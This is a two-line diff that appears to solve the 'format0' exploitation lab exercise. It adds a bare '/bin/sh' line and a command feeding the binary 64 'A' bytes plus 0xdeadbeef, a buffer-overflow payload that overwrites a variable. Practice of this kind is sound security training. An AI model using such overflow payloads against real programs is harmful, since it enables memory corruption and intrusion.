@@ -1,0 +1,2 @@
+/bin/sh
+./format0 $(python -c "print 'A'*0x40+'\xef\xbe\xad\xde'")
